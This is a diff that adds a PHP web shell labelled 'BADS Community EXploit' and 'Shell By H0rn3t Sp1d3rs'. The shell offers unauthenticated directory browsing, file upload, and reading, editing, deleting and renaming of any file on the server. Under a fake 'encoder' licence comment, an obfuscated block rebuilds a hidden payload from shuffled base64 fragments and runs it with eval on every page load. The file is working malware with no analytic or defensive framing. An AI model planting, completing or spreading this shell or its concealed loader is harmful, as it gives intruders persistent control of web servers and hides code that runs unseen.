@@ -1,0 +1,453 @@
+
+<?php error_reporting(0); ?>
+<!DOCTYPE html>
+<html>
+<head>
+	<title> <\- BADS Community EXploit </title>
+	<link href="https://fonts.googleapis.com/css2?family=Courgette&family=Cuprum:ital@1&family=Rowdies&display=swap" rel="stylesheet"> 
+</head>
+<style>
+	* {
+		font-family: cursive;
+		color: #000;
+		font-family: 'Cuprum', sans-serif;
+	}
+
+	body {
+		background-repeat: no-repeat;
+		background-attachment:fixed;
+		background-size: 100% 1700px;
+	}
+	body h1{
+		color: #A52A2A;
+		text-shadow: 2px 2px 2px #000;
+		font-size: 50px;
+	}
+	.dir {
+		text-align: center;
+		font-size: 30px;
+	}
+	.dir a{
+		text-decoration: none;
+		color: #48D1CC;
+		text-shadow: 1px 1px 1px #000;
+
+	}
+	.dir a:hover{
+		text-decoration: none;
+		color: red;
+	}
+	table {
+		margin: 12px auto;
+		height: 100%;
+		border-collapse: collapse;
+		font-size: 30px;
+	}
+	table,th {
+		border-top:1px solid #000;
+		border-right:3px solid #000;
+		border-bottom: 3px solid #000;
+		border-left:1px solid #000;
+		box-sizing: border-box;
+		padding: 2px 2px;
+		color: #F0E68C;
+		text-shadow: 1px 1px 1px #000;
+	}
+	table,td {
+		border-top:1px solid #000;
+		border-right:3px solid #000;
+		border-bottom: .5px solid #000;
+		border-left:1px solid #000;
+		box-sizing: border-box;
+		padding: 8px 8px;
+		color: red;
+	}
+	table,td a {
+		text-decoration: none;
+		color:#8A2BE2;
+		text-shadow: 1px 1px 1px #000;
+	}
+	table,td a:hover {
+		text-decoration: none;
+		color: red;
+	}
+	.button1 {
+		width: 70px;
+		height: 30px;
+		background-color: #999;
+		margin: 10px 3px;
+		padding: 5px;
+		color: #000;
+		border-radius: 5px;
+		border: 1px solid #000;
+		box-shadow: .5px .5px .3px .3px #fff;
+		box-sizing: border-box;
+	}
+	.button1 a{
+		width: 70px;
+		height: 30px;
+		background-color: #999;
+		margin: 10px 3px;
+		padding: 5px;
+		color: red;
+		border-radius: 5px;
+		border: 1px solid #000;
+		box-shadow: .5px .5px .3px .3px #fff;
+		box-sizing: border-box;
+	}
+	.button1:hover {
+		text-shadow: 0px 0px 5px #fff;
+		box-shadow: .5px .5px .3px .3px #555;
+		text-decoration: none;
+	}
+	textarea {
+		border: 1px solid green;
+		border-radius: 5px;
+		box-shadow: 1px 1px 1px 1px #fff;
+		width: 100%;
+		height: 400px;
+		padding-left: 10px;
+		margin: 10px auto;
+		resize: none;
+		background: green;
+		color: #ffffff;
+		font-family: 'Cuprum', sans-serif;
+		font-size: 13px;
+	}
+</style>
+<body>
+	<center><h1>Shell By H0rn3t Sp1d3rs</h1></center>
+  <div class="dir">
+	<?php  
+	if (isset($_GET['dir'])) {
+			$dir = $_GET['dir'];
+		} else {
+			$dir = getcwd();
+		}
+
+		$dir = str_replace("\\", "/", $dir);
+		$dirs = explode("/", $dir);
+
+		foreach ($dirs as $key => $value) {
+			if ($value == "" && $key == 0){
+				echo '<a href="/">/</a>'; continue;
+			} echo '<a href="?dir=';
+
+			for ($i=0; $i <= $key ; $i++) { 
+				echo "$dirs[$i]"; if ($key !== $i) echo "/";
+			} echo '">'.$value.'</a>/';
+	}
+	if (isset($_POST['submit'])){
+
+		$namafile = $_FILES['upload']['name'];
+		$tempatfile = $_FILES['upload']['tmp_name'];
+		$tempat = $_GET['dir'];
+		$error = $_FILES['upload']['error'];
+		$ukuranfile = $_FILES['upload']['size'];
+
+		move_uploaded_file($tempatfile, $dir.'/'.$namafile);
+				echo "
+					<script>alert('diupload!!!');</script>
+					";
+						
+
+	
+	}
+	?>
+
+	<form method="post" enctype="multipart/form-data">
+		<input type="file" name="upload">
+		<input type="submit" name="submit" value="Upload">
+		
+	</form>
+
+  </div>
+<table>
+	<tr>
+		<th>Nama File / Folder</th>
+		<th>Size</th>
+		<th>Action</th>
+	</tr>
+	<?php
+	$scan = scandir($dir);
+
+foreach ($scan as $directory) {
+	if (!is_dir($dir.'/'.$directory) || $directory == '.' || $directory == '..') continue;
+
+	echo '
+	<tr>
+	<td><a href="?dir='.$dir.'/'.$directory.'">'.$directory.'</a></td>
+	<td>--</td>
+	<td>NONE</td>
+	</tr>
+	';
+	} 
+foreach ($scan as $file) {
+	if (!is_file($dir.'/'.$file)) continue;
+
+	$jumlah = filesize($dir.'/'.$file)/1024;
+	$jumlah = round($jumlah, 3);
+	if ($jumlah >= 1024) {
+		$jumlah = round($jumlah/1024, 2).'MB';
+	} else {
+		$jumlah = $jumlah .'KB';
+	}
+
+	echo '
+	<tr>
+	<td><a href="?dir='.$dir.'&open='.$dir.'/'.$file.'">'.$file.'</a></td>
+	<td>'.$jumlah.'</td>
+	<td>
+	<a href="?dir='.$dir.'&delete='.$dir.'/'.$file.'" class="button1">Hapus</a>
+	<a href="?dir='.$dir.'&ubah='.$dir.'/'.$file.'" class="button1">Edit</a>
+	<a href="?dir='.$dir.'&rename='.$dir.'/'.$file.'&nama='.$file.'" class="button1">Rename</a>
+	</td>
+	</tr>
+	';
+}
+if (isset($_GET['open'])) {
+	echo '
+	<br />
+	<style>
+		table {
+			display: none;
+		}
+	</style>
+	<textarea>'.htmlspecialchars(file_get_contents($_GET['open'])).'</textarea>
+	';
+}
+
+if (isset($_GET['delete'])) {
+	if (unlink($_GET['delete'])) {
+		echo "<script>alert('dihapus');window.location='?dir=".$dir."';</script>";
+	}
+}
+if (isset($_GET['ubah'])) {
+	echo '
+
+		<style>
+			table {
+				display: none;
+			}
+		</style>
+
+		<a href="?dir='.$dir.'" class="button1"><=Back</a>
+		<form method="post" action="">
+		<input type="hidden" name="object" value="'.$_GET['ubah'].'">
+		<textarea name="edit">'.htmlspecialchars(file_get_contents($_GET['ubah'])).'</textarea>
+		<center><button type="submit" name="go" value="Submit" class="button1">Liking</button></center>
+		</form>
+
+		';
+}
+if (isset($_POST['edit'])) {
+	$data = fopen($_POST["object"], 'w');
+	if (fwrite($data, $_POST['edit'])) {
+
+		echo 
+			'
+			<script>alert("Berhasil diedit!!!");window.location="?dir='.$dir.'";</script>						
+			';
+
+	} else {
+		echo "
+			<script>alert('gagal');</script>					
+			";
+	}
+}
+
+if($_GET['rename']){
+	if(isset($_POST['newname'])){
+		if(rename($_GET['rename'], $_GET['dir'] . '/' .$_POST['newname'])){
+			echo '<font color="green">Ganti Nama Berhasil</font><br/>';
+			echo "<script>window.location='?dir=".$dir."';</script>";
+		}else{
+			echo '<font color="red">Ganti Nama Gagal</font><br />';
+		}
+	}
+echo '<br><center><form method="POST">
+New Name : <input name="newname" type="text" size="20" value="'.$_GET['nama'].'" />
+<input type="hidden" name="path" value="'.$_GET['dir'].'">
+<input type="hidden" name="opt" value="rename">
+<input type="submit" value="Go" />
+</form></center>';
+}
+
+?>
+</table>
+</body>
+</html>
+
+<?php
+$O00OO00 = "
+ * ============================================
+ * Mr999Plus PHP Encoder Script
+ * ============================================
+ * 
+ * ABOUT:
+ * --------
+ * This PHP Encoder is designed to securely encode data, shuffle characters, and manage 
+ * data positions to make encoded content unreadable without a proper key. This encoder 
+ * can be used for obfuscating sensitive data, protecting information from unauthorized 
+ * access, and ensuring data integrity during transfer or storage.
+ *
+ * FEATURES:
+ * ----------
+ * - Encode strings into mixed and shuffled formats.
+ * - Remove duplicate data entries automatically.
+ * - Generate a key for decoding the encoded data back to its original format.
+ * - Flexible design to support various data formats and encoding requirements.
+ *
+ * DEVELOPER INFO:
+ * ----------------
+ * Developer: Samiul Alim
+ * Version: 1.0
+ * Date: 2025-03-05
+ * 
+ * CONTACT:
+ * ---------
+ * - Email: samiulalim1230@gmail.com
+ * - Telegram: https://t.me/samiulalim1230
+ * - GitHub: https://github.com/samiulalim1/
+ * - Telegram Channel: https://t.me/mr999plus
+ *
+ * LICENSE:
+ * ---------
+ * This script is licensed under the MIT License. You are free to modify, distribute, and 
+ * use this script with proper attribution to the developer.
+ *
+ * DISCLAIMER:
+ * ------------
+ * This encoder is provided as-is without any warranties. The developer is not responsible 
+ * for any misuse or data loss resulting from the use of this script.
+ *
+ * ENCODER ID : [JZQ5j-39992e5c79-MjAyNS0wMy0wNSAwMTo1MjozMg-cd172]
+ * 
+ * ============================================
+";
+
+$O00OO00 = str_replace(["\r\n", "\n", "\r"], "**", $O00OO00);
+$OO0O0O0 = $O00OO00[1523].$O00OO00[145].$O00OO00[1524].$O00OO00[507];
+$OO0O0O0 .= $O00OO00[54].$O00OO00[76].$O00OO00[144].$O00OO00[965].$O00OO00[1525];
+$OO0O0O0 .= $O00OO00[76].$O00OO00[144].$O00OO00[964].$O00OO00[54].$O00OO00[79].$O00OO00[144];
+$OO00000 = $O00OO00[817].$O00OO00[426].$O00OO00[275].$O00OO00[60].$O00OO00[54].$O00OO00[275];
+$OOOO0O0 = $O00OO00[60].$O00OO00[817].$O00OO00[426].$O00OO00[1197].$O00OO00[60].$O00OO00[817];
+$OOOO0O0 .= $O00OO00[426].$O00OO00[1525].$O00OO00[305].$O00OO00[1523].$O00OO00[145].$O00OO00[1197];
+$O00O0O0 = $O00OO00[79].$O00OO00[144].$O00OO00[964].$O00OO00[817].$O00OO00[76].$O00OO00[144].$O00OO00[964];
+$O00O0O0 .= $O00OO00[143].$O00OO00[917].$O00OO00[144].$O00OO00[964].$O00OO00[54].$O00OO00[204].$O00OO00[144];
+$OO0O0O0 .= $O00OO00[204].$O00OO00[512].$O00OO00[79].$O00OO00[144].$O00OO00[964].$O00OO00[512].$O00OO00[917];
+$OOOO0O0 .= $O00OO00[1526].$O00OO00[54].$O00OO00[1527].$O00OO00[189].$O00OO00[60].$O00OO00[54].$O00OO00[275];
+$OO00000 .= $O00OO00[68].$O00OO00[964].$O00OO00[1523].$O00OO00[145].$O00OO00[1524].$O00OO00[806].$O00OO00[1523];
+$O00O0O0 .= $O00OO00[965].$O00OO00[54].$O00OO00[204].$O00OO00[144].$O00OO00[965].$O00OO00[817].$O00OO00[204].$O00OO00[144];
+$OOOO0O0 .= $O00OO00[1525].$O00OO00[60].$O00OO00[817].$O00OO00[426].$O00OO00[141].$O00OO00[60].$O00OO00[817].$O00OO00[426];
+$OO00000 .= $O00OO00[145].$O00OO00[70].$O00OO00[204].$O00OO00[1523].$O00OO00[145].$O00OO00[1524].$O00OO00[917].$O00OO00[1523];
+$OO0O0O0 .= $O00OO00[144].$O00OO00[964].$O00OO00[54].$O00OO00[145].$O00OO00[144].$O00OO00[60].$O00OO00[817].$O00OO00[144].$O00OO00[54];
+$O00O0O0 .= $O00OO00[964].$O00OO00[512].$O00OO00[1527].$O00OO00[1525].$O00OO00[60].$O00OO00[54].$O00OO00[275].$O00OO00[816].$O00OO00[60];
+$OOOO0O0 .= $O00OO00[189].$O00OO00[60].$O00OO00[817].$O00OO00[426].$O00OO00[144].$O00OO00[60].$O00OO00[817].$O00OO00[426].$O00OO00[68].$O00OO00[60];
+$O00O0O0 .= $O00OO00[817].$O00OO00[1527].$O00OO00[1197].$O00OO00[426].$O00OO00[817].$O00OO00[204].$O00OO00[144].$O00OO00[964].$O00OO00[1525].$O00OO00[1525];
+$OO00000 .= $O00OO00[145].$O00OO00[1197].$O00OO00[885].$O00OO00[1523].$O00OO00[145].$O00OO00[1197].$O00OO00[965].$O00OO00[143].$O00OO00[76].$O00OO00[144].$O00OO00[883].$O00OO00[512];
+/*
+ * ============================================
+ * Mr999Plus PHP Encoder Script
+ * ============================================
+*/
+$OO0O0OO = $OO0O0O0.$OOOO0O0.$OO00000.$O00O0O0; $OO0O0O0 = "";
+$OO0O00O = base64_decode($OO0O0OO); $O00OO0 = urldecode($OO0O00O);
+$OO00OO0 = [46,45,45,5,56,5,56,5,56,5,56,5,56,23,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,3,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,17,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,16,10,0,24,2,13,47,19,43,42,30,53,29,22,18,26,65,21,62,20,12,39,4,59,66,67,8,51,60,34,49,31,28,11,25,35,55,33,7,45,1,45,45,63,58,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,57,41,45,45,45,45,44,6,45,45,45,45,45,45,45,54,61,48,36,37,45,45,45,45,45,45,45,50,45,15,38,45,45,14,40,45,52,9,45,64,5,56,5,56,5,56,5,56,5,56,32,27];
+/*
+ * ============================================
+ * Mr999Plus PHP Encoder Script
+ * ============================================
+*/
+$O00O0O0 = [
+	"3RFUulzNBVTMXtid5h1V29yMvgGWmJWVvomawhkVzQEcRZGWwRFZsNTOvkzNVFVOxRVU1lXcax2StlHOIR1NPhzVhN1YJBDZ2RTZ",
+	"gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI7kyXf91XkgyXfRSPf91XfRCIgACIgACIgACIgACIgACIgACIgACIgACI",
+	"oBVWtJWev5WaCZ2K4lDSy50L4MDc0BXSZ5kcO9yY15GR6pWN5E2NWFjWPpWe05GUWVldttUZvkWOvUEW24WZ6Jnd3NGU6ticXtSe",
+	"gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIg8GajVGIgACIgACIgACI",
+	"llUNPtSOoZ0UIZWUwB1L0JlS4Z1RstydzNXM4UjeH1EOul0auV3c2oHbRlmQXhjTjhjWwY0LKdjMu1EUpxWR5g1b15UbDljNNpGV",
+	"K0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gC",
+	"f91XkACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI",
+	"jFjTWFXVm10bvYVOrZ2UZhzb6RXMXRncOV2J98FJgACIgACIgACIgACIgACIgACIgACIgsTKf91XkgyXfRSPf91XkACIgACIgACI",
+	"m92KoZ0Uvk3a2dnd2JFM4UmbzQ1Z4Qkaph1ZmNUTOhHMv9ER4VmQTBHU1gleN90Z3sCSFl1SNFENvpUcENkVxokU0JEeppnQjZjS",
+	"981Xf91XkACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI",
+	"kACIgACIgACIK0wOnw2Zq5mU5o2N4JndZlnbmhFcUZWMzcTNSBFVzkDRWN2LidjUxsiYv8CStt0Kkd3NQ50R1sSWvwkYzITO0MzM",
+	"SJFTah0LzcTRvYWVVVFWYhESGxGM4M3K1ZlazUnR1YlT0AFVkhmV4knNkVDUSRFZkR2YrJldxAVM2lzLSJlUkRGZjVVVVhFWIhkR",
+	"hZXNjhWS0A1K5JHR4lFTzBnYFBVZVtGOMZTNrR1Svk1cBRVODVEZvkFZVVXMHJDNlJDNjlkZHFHNnNTcygEUmZGU0AFeKZUZiZmZ",
+	"UFFZyVmTRN3dOxEMYJjN5oVZyMGW2Y2SlJVWYNGOkpUWaNjT3Y0KhVUbihWMqV1Y59yQIh3ToVDa4lHeBdXWENkdPhVe1QnNW1WS",
+	"gACIgACIgACIgACIgACIgACIgACIK0wOn0TRHpVaxcVWzlTMYdSPf91Xf91Xf91Xf91Xf91Xf91XkoQD7cSP9c3TwhjRK92dXllM",
+	"gACIgACIgACIgACIgACIgAyOn0TUuNGaSNzYmpkMiBCIn0zXf9FJgACIgACIgACIgACIgACIgACIgAyOnonTYpVeChlY25UbiFDc",
+	"gACIgACIgACIgACIgACIgACIK0wOpgyXf91Xk0zXf91Xf91XfRCI7kSKp8FJo81XkgyXf91Xf9FJo81Xf91Xf91Xf9FJ7kCKf91X",
+	"gACIgACIgACIgACIgACIgACIgAyOpgyXf91XfRCIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI",
+	"3V0MYZWQGl2K2h3d6NkNNJkew0ERQNkNqljbw8mZDp0S6BTVHhTWkhHRCdWShNnUXZWaWZkSJlHT4R1MWpGerFWO2hXU1MUYmlzQ",
+	"rpWZoZnM1wmVVVVbudjWys0dMp0U6Z1KO5kZZNWVEFTYohHO1QUeF50ZKJTMm92N3oFekx2S5Y2bLJWV65kbRZFZVZWZzM0bygjM",
+	"4AndnpHSrEjNxlUZHRkNXhka4kkUS9yKh1EWG90TrpFRXx0NudUR1oGSCNlbKZzKahHTDFEU4FzdUNVV2QnZBRjNaRFZUhVdy0UM",
+	"4hzKHJDRpFnbiVVNnJncRZldxclZvFja6B1QLhjShBzU5ckMqFlUxkWQmRHapNHewRnY08yc0pkN1x0QPZ0NIlFUFdEStJFOQhGV",
+	"DVDU5sGZOhjTQlkYqFjZvAlQLhGMxMTWIlleGdEerEzRaZXZ2dGWvtCdNBFUtJlNqd0TC1mR3oHRld0LaVzTQVEWrVEUIhWZzUjS",
+	"K0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI",
+	"apFMJNGS2h0cQhzKvgkeQhlQqJnaadWMWNmUnhXZ4hjbapWd6NjMP5GZ0pHW6pHOzZGVtRWTLRGTuJWTNZGM4MmdzJjdvEGTrokQ",
+	"WFDO39kS5dXbJFHbqJ2SvcjSsREb6xmaIZ0blRWVHZHUF9Wc5x0Uk12K2QDNv9WcrYHN5J3RJZDWmZkV0lTOjZnSVJWa0QjQStiR",
+	"Q9iYjhGOGdVaYFmT0llVydTSThlbZNHcwxGdG5WY00ERQFDOvVTbi1ETzcHdDVGUiZ1bydzV2hTOJdlRFNUM1Vldoh3U4UDeyI0V",
+	"zVHbQlTO5IXTgcmbpRWYvx0J98FJ7ciZ05WayB3J981XkACIgACIgACI",
+	"h9GSlVGWsBlRNZlQnJ3UDVkZwUUbrUETUJVeUZWWjRjev8mSthlNrUUa5FGVUJWT1t2K1pVUst2UWVjW2FjV1syVxBlch9yK1tGd",
+	"0llQM90M4UDeGNHW3NTYrsGcD5WMulFOwpEeod1RYlnaL5WYzQ2M1JUdZdVM2EWbop1KPNWevAjbEJDal9iTzJ3Z1YGOtdDZxRkd",
+	"CxGUwlTcq9UOsFEUDRzTvtmeF1kNDFUdthUbw9iYkNlY4kEOCVHVhZWSvtkcolUWoJDVYhERJN0TLlTM4QXcjpUdwcWd4YDZw40T",
+	"q9kSGtCNwpXNRBTTtpVO5VlcQN0ZuR1VrUXWqRmcMdnWqp2MNRXS5R0ZyJncnNUQsJzLoJ0KD9UVEFWTvM1ZNhkeFBVMPZmSXxUb",
+	"gACIgACIgAiCNszJycTMkNWLn1kevpWTx8GVNdXQT50dwkXT3BzUOlXQq1UL5czY1UmM5kTOzAiOElEIy9GdhN2c1ZmYPBCUIBFI",
+	"rgXMxgFbOJGZ5JndlZDczEGWwFTVGRWeM52cxg3arlTeJ1EVz8COhdnWV1WaJhmYrF1UDBHOpxUWENUe3MUUBtGRLZHNklETRV2a",
+	"PNETldkdVFnMlZTa5dUOx8UakdlVMZHVYBzYVxkVTFzVpNmMjtWdwUUcFREZ0JncBtSdzNkSLlmbjNFbZplNhpmS30UMMxUOyEka",
+	"O9CM5kTM5kUOkFTaiVDRu5kZzkTTkNzMxYWO4gHex8SO5Q2N5UjeuBFOoh1bj5EMxEHNGRlQvMVctdzUTV0NpZHMEN2SOhGcXl3Q",
+	"gACIgACIgACIgACIgACIgACIgACIgACInUGZvNWZk9FN2U2chJ2JgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI",
+	"gACIgACIgACIgACIgACIgACIgACIgACIgASPf9FJgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI",
+	"zoFIn0zXf91Xf9FJgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI",
+	"O5marIWT3cmN4g1SrQEOiZnV05GeMlUZFB3SpBVWycHSlBndS1UbzIGR2oFVtZFc2sSUlNEcMZlZEdXNrEnTYN3LiFEWi9iY0IWb",
+	"WdUS1pEWkBjVtN2J981Xf91Xf91Xf91Xf91XkACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI",
+	"kACIgACIgACIK0wOp81Xf91Xf91Xf91Xf91XkgyXfRSPf91Xf91Xf91Xf91Xf9FJgACIgACIgACIgACIgACIgACIgACIgACIgACI",
+	"vVmUPhkTDZHdyYFRnZVYjF0KGV0LR1mMTNjZMBjaK50MwcmZGlzVqtEcU9iSENTVKdlMUJFbzkjQ0lUaVtSVRNmNChGN3N0djV0b",
+	"l9yNrATeGdjN4hjbDJWYrl1UDlmNWlVTBJzMSFlchpVR6B3dyU0ZzJENWp1dMh3L3NGcyknZQdFSyRTcsllSBtyRhp1ZlB1TyEjM",
+	"gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgsTKf91Xf91Xf91Xf91Xf91Xf91XkgyXfRSPf91Xf91Xf91Xf91Xf91X",
+	"gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI",
+	"==wOf91Xf91Xf9FJgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI",
+	"3UlQFxWO2E0budFNxFjUYJkNvYjc3VWeUpWTxEXWxUzVRRWV5cDO0YmWQ9iQxdzQ0ETbVZDM5ITTxB1LoFTVuFFdPJjctpFMkdVM",
+	"gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgAyOgACI",
+	"YdkbNNEVsd1VoN1Qst2YBtyLjZneJFFUv9mZkd3Rz52RLJ2MEVGVUVVd3hEeDFnRzsCetp3KZRGd0glYGdjarc3QSdlMrskbxFGV",
+	"gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgAyOnonUuJGbS5mY25kMYBjVyolZKJjYn0zXf91XkACIgACIgACI",
+	"yYFN3JTNx8WNWVFROdEeOlXWlFUNkFFeDd1cs5We2MUdHZDTlZ3RwxkeEZGWUdXe6FFWwAFSOJkUNFjcuxmU6VGR2o0KCJFOPp0N",
+	"gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgszJ1Z0VaNnTyg1a1clWmpkMiBCIgAyJ",
+	"U1EWYdjTillTJBFVlNHWwcUWvUkNIV1dhhGeLN3L3NWa5c3YvtUbZRlM3IGd2tiVvdWaxclewM3QRlENUp2KGh0aGFmVhZlVqJWU",
+	"913OpIyO91XZk92QzRye7lycnJXQzRCKu9Wa0Nmb1ZGIuJXd0VmcigCbhZXZg4mc1RXZytXKlR2bDNHJsM3ZyF0ckgSYkJWbhx2X",
+	"jFHO3tWbv9yVotiNy1WRytyc2wGNy9iVQJmbYRXQShDVYtycYlDNwVGNxh0LFR1KsplWlV2cm9mMHR1Mx5GWmpXbu9SZ2B1bYZUd",
+	"NoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQD",
+	"gACIgACIgACIgACIgACIgACIgACIgsTKf91Xf91Xf91Xf91Xf9FJscyXkcCKf91Xf91Xf91Xf91Xf91Xf91Xk0zXf91Xf91Xf91X",
+	"fRCKf9FJ981Xf91XkACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI",
+	"zAXQ1YjaMRUN4lVZwFDR1AVd2NEeadXS2dHOBR1Uyg0NrtWZYdXepVzaZRGd4Y2RilDcm5ka5JlbLlUYaNGdwc1Mid2S1ZlUuNlY",
+	"49Ea4lGO2cGc4NTe4w2YSBje3p2cHZzb1V0TTRkSQx0cNNnTQ9CRK9Ua35mQThkVyRTaWRHdatCS1tiMn5mVmdUa3MDRWhHWrYlM",
+	"fBibvlGdj5WdmtXKpcSYkJWbhx2XfdCKzR3cphXZf52bpR3YuVnZhgiZpBCIgACIgACIgACI7kyXf91Xf9FJo81Xk0zXf91Xf9FJ",
+	"ZBFRvh1cZdFUZ12RspFa2k1b3QEeURTSVF3btVkaiN2bqpGaqhmawNGZyd1QXl1YJpmVZlUOtJ3K4lDawtiNjRGaqhGcMVDNLZXS",
+	"gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI7kyXf91X",
+	"gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQD",
+	"HRlbYhHWxoWaihGNwNHSXpHRW52Z2M1R380ayoXeGBDexhmcjJGcyRzVqp2Qwo1dYRzTDhHeoZDS1QHUFZHM6JmTmV0bEBXd5IXc",
+	"ilFSwATNMlFVCF3KNJ1MHpWM28Gcld1do5WYzpFVW50YJ1kdx8ETXxEZGpVO0hXdvZVW4oVdGdHWnlGZXpFMkJTTOFjNL9ydkZzL",
+	"ipnRw8meZhzb40Ee2syKop1dk9UexVHRzJlNkdESrE3MTRjbphXZJVmZaVTQIlFRoVDVZZWRIllepVGcuJlYwoUUI5GUC1GUaFUN"
+];
+/*
+ * ============================================
+ * Mr999Plus PHP Encoder Script
+ * ============================================
+*/
+$OO0000 = $O00OO0[7].$O00OO0[36].$O00OO0[29];
+$O00O0O = $O00OO0[3].$O00OO0[6].$O00OO0[33].$O00OO0[30];
+$O0OO00 = $O00OO0[30].$O00OO0[22].$O00OO0[24].$O00OO0[26].$O00OO0[24];
+$OO0O00 = $O0OO00[0].$O00OO0[18].$O00OO0[3].$O0OO00[0].$O0OO00[1].$O00OO0[24];
+$O00O00 = $O00O0O[2].$O00OO0[10].$O0OO00[2].$O00OO0[24].$O0OO00[0].$O00OO0[9];
+$O00O0O.= $O0OO00[1].$OO0000[1].$OO0000[2].$O0OO00[3].$O00O0O[3].$O00OO0[32].$O00OO0[35].$O00OO0[26].$OO0O00[3]; 
+/*
+ * ============================================
+ * Mr999Plus PHP Encoder Script
+ * ============================================
+*/
+
+foreach($OO00OO0 as $OO00O0O){$OO0O0O0 .= $O00O0O0[$OO00O0O];}
+eval($O00O0O($O00O00($OO0O0O0)));
+
+?>
+
